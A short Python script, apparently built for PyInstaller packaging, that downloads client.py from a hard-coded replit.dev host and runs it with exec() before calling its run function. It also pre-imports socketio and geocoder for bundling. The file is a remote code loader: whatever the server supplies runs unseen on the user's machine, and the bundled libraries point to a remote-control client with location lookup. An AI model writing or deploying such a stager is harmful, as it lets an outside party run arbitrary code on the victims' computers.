from urllib.request import urlopen
import importlib.util

#to make pyinstaller happy
import socketio
import geocoder
import requests

#pyinstaller happy now

url = "https://1e26c3bd-d2fc-4199-8c95-28e5c4f20ff4-00-3mijlg2wczefz.riker.replit.dev/"

# download python code
def create_moduel(url):
  code = urlopen(url).read().decode('utf-8')
  spec = importlib.util.spec_from_loader('temp', loader=None)
  module = importlib.util.module_from_spec(spec)

  # execute the code in the temporary module
  exec(code, module.__dict__)

  return module


module = create_moduel(f"{url}client.py")

module.run(url)